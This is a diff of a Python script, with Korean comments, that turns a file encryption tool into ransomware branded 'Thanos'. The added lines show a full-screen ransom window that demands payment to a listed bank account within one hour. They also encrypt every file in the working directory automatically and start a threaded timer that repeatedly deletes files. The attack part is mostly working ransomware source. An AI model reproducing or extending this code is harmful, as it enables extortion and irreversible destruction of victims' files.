@@ -1,17 +1,59 @@
-from builtins import int, input, len, round, range
-
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto import Random  #RSA 키 생성시 필요
 from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
 import glob
 import os
+import threading
+from time import sleep
 
-import binascii
+#gui 라이브러리
+import tkinter
+from ui import thanos
+from tkinter.ttk import Label
+from PIL import Image, ImageTk
 
 
+# /////////////////////////////////////////////////////////////////////////////////////////////////////////////////gui 관련 함수&코드
+def key_submit():
+    pw = str(password.get())
+    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
+    label6.pack()
+    pwbutton.destroy()
+    label4.destroy()
+    password.destroy()
+
+window = tkinter.Tk()
+window.title("ransomware")
+window.state('zoomed')  # maximize the window
+height = window.winfo_height()  # ...
+width = window.winfo_width()
+window.configure(background="black")
+
+label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
+label1.pack()
+label2 = tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red", bg="black", font='Helvetica 18 bold')
+label2.pack()
+label3 = tkinter.Label(window, text="국민 786102-00-040854", fg="red", bg="black", font='Helvetica 18 bold')
+label3.pack()
+
+label4 = tkinter.Label(window, text="password:", fg="red", bg="black", font='Helvetica 14 bold')
+label4.pack()
+password = tkinter.Entry(window)
+password.pack()
+
+pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
+pwbutton.pack()
+
+image = tkinter.PhotoImage(file="../ui/face.png")
+
+label5 = tkinter.Label(window, image=image)
+label5.pack()
 
 
+iv = os.urandom(16)
+
+#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////파일 리스팅 함수
 
 def list_files(path, ext=None):
     filelist=[]
@@ -27,6 +69,8 @@ def list_files(path, ext=None):
 
     print("filelist: \n", filelist)
     return filelist
+
+#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 
 def startTimer():
     print("파일 삭제를 시작합니다")
@@ -79,6 +123,8 @@ def remove_files(path,ext=None):
     #label7.pack()
 
     threading.Timer(5, remove_files, [os.getcwd()]).start()
+
+#/////////////////////////////////////////////////////////////////////////////////////////////////////////////암호화 복호화 함수
 
 def enc(key, cipher, in_filename, out_filename=None):
 
@@ -198,6 +244,7 @@ def dec( cipher, in_filename, out_filename):
 
     print("---END DECRYPTION : AES")
 
+#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////메인함수
 
 if __name__ == "__main__":
 
@@ -211,35 +258,20 @@ if __name__ == "__main__":
     print("비밀키는 : ", private_key)
 
 
-
-    '''
-    while True:
-        menu = int(input("1. 암호화\t2. 복호화\t3. 나가기\n"))
-        if (menu == 1):
-            enc_targetlist = list_files(os.getcwd())    #os.getcwd는 해당 폴더에서 가져옴.
-            #나중에 전체 트래킹 하는 법 알아야함
-            print("enc_targetlist: \n", enc_targetlist)
-            for enc_target in enc_targetlist:
-                if enc_target.split('.')[-1]=='antdd':
-                    continue
-                enc(key, cipher,enc_target, out_filename=None)
-                #remove_files(os.getcwd())
-        elif (menu == 2):
-            dec_targetlist = list_files(os.getcwd(), '.antdd')
-            print("dec_targetlist: \n", dec_targetlist)
-            for dec_target in dec_targetlist:
-                #print(os.path.splitext(dec_target)[0])
-                #x = get_tmp(os.path.splitext(dec_target)[0])
-                print(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
-                #x = get_tmp(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
-                dec(cipher,dec_target, out_filename=None)  # x 없어야함
-        elif (menu == 3):
-            break
-        else:
+    #timer 테스트
+    enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
+    # 나중에 전체 트래킹 하는 법 알아야함
+    print("enc_targetlist: \n", enc_targetlist)
+    for enc_target in enc_targetlist:
+        if enc_target.split('.')[-1] == 'antdd':
             continue
-    '''
-    #해당 파일들은 확인 끝남
-    #text(key, 'target.txt')
-    #text(key, '컴보.docx')
-    #image(key, 'family.jpg')
-    #image(key, '짱구얌.png')
+        enc(key, cipher, enc_target, out_filename=None)
+
+    # 타이머 시작 코드
+    th1 = threading.Thread(target=startTimer)
+    th1.start()
+
+    # gui 시작 코드
+    th2 = threading.Thread(window.mainloop())
+    th2.start()
+
